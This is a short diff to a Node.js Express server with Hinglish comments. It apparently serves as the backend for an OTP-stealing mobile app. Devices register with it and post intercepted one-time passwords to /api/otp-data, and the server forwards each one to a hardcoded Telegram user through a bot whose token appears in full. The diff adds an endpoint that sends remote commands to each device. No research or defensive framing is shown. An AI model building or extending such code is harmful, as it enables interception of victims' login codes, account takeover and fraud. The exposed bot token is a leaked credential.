@@ -1,5 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios'); // ⚠️ YEH IMPORT MISSING THA
+const axios = require('axios');
 const express = require('express');
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
@@ -26,7 +26,14 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
-// App se SMS/OTP aayega
+// App ko commands bhejo (GET /api/commands?deviceId=...)
+app.get('/api/commands', (req, res) => {
+    const { deviceId } = req.query;
+    // Yahan command bhejne ka logic
+    res.json({ command: 'status' });
+});
+
+// App se OTP aayega
 app.post('/api/otp-data', (req, res) => {
     const { deviceId, otp } = req.body;
     bot.sendMessage(YOUR_USER_ID, `📩 OTP for device ${deviceId}: ${otp}`);
@@ -133,7 +140,6 @@ function isAuthorized(msg) {
     return msg.from.id === YOUR_USER_ID;
 }
 
-// Express server start karo
 app.listen(3000, () => {
     console.log("Server running on port 3000");
 });
